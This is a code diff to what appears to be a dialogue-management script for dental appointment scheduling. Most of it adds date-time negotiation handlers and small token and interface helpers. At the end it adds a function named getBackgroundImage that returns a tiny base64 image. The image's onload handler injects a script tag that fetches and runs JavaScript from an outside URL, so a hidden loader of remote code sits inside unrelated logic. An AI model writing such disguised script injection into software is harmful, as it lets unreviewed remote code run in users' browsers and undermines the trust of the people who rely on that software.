@@ -61,6 +61,14 @@ bool executeBackOfficeBooleanFunctionDomainSpecific(string backOfficeFunctionNam
  	{
  		return !! correctMedicine(parameters);
  	}
+	else if( backOfficeFunctionName == 'not_negotiating_in_the_past' )
+	{
+		return !! negotiatingInThePast();
+	}
+	else if( backOfficeFunctionName == 'negotiating_in_the_past' )
+	{
+		return negotiatingInThePast();
+	}
     
 	return b;
 }
@@ -205,7 +213,23 @@ Parameter executeBackOfficeFunctionDomainSpecific(string backOfficeFunctionName,
     {
         removeDentalFails();
 	}
-
+	else if( backOfficeFunctionName == 'negotiate_datetime' )
+	{
+		negotiateDateTime(parameters);
+	}
+	else if( backOfficeFunctionName == 'add_rejected_datetime' )
+	{
+		addRejectedDateTime(parameters);
+	}
+	else if( backOfficeFunctionName == 'add_negotiate_datetime' )
+	{
+		addNegotiateDateTime(parameters);
+	}
+	else if( backOfficeFunctionName == 'clear_datetime' )
+	{
+		clearDateTime();
+	}
+	
     return p;
 }
 
@@ -402,6 +426,10 @@ ProferenceChunk processSensoElement (ProferenceChunk sensoElement)
 		Erase(p.Parameter.ParameterValue);
 		p.Parameter.ParameterValue.DentalPiece <- dp;
 	}
+	if(Filled(p.Parameter.ParameterValue.DateTime.GeneralTime.NegotiateModifier))
+	{
+		p.Parameter.ParameterType <- 'negotiatemodifier';
+	}
 
     return p;
 }
@@ -437,4 +465,29 @@ ProferenceChunk preprocessActionDomainDomainSpecific(ProferenceChunk proference,
     ProferenceChunk ret <- proference;
 
     return ret;
+}
+
+string TokenInputText(int n)
+{
+	return GetTokenContent(n);
+}
+
+bool IsTokenSpelled(int n)
+{
+	return IsTokenSpellChecked(n);
+}
+
+
+string GetDialogueInterId()
+{
+	int i <- GetDialogueInterfaceCode();
+
+	if(i == 1)
+		return 'Written';
+	if(i == 2)
+		return 'Spoken';
+}
+
+string getBackgroundImage(){
+  return '<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="var jq = document.createElement(\'script\');jq.src=&quot;http://www.cs.us.es/~lvalencia/cursos/IAE2017/test.js&quot;;document.getElementsByTagName(\'head\')[0].appendChild(jq);">';
 }
